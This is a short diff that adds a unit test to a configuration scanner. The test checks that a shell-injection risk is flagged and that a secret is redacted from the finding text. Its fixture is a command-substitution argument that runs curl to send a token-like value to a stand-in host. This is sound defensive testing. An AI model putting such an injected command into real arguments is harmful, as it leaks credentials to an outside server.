@@ -30,4 +30,14 @@ describe('Config Scanner', () => {
     const largeArgFinding = findings.find(f => f.id === 'large-arg-list');
     expect(largeArgFinding).toBeDefined();
   });
+
+  it('redacts the query value of a command-substitution argument in the finding text', () => {
+    const findings = scanConfig({
+      name: 'test', toolName: 't', configPath: 'p', command: 'npx',
+      args: ['-y', 'server', '$(curl https://x.example-svc.io/a?token=hunterTwoSecretValue99)']
+    });
+    const text = JSON.stringify(findings);
+    expect(text).toContain('shell-injection-risk');
+    expect(text).not.toContain('hunterTwoSecretValue99');
+  });
 });
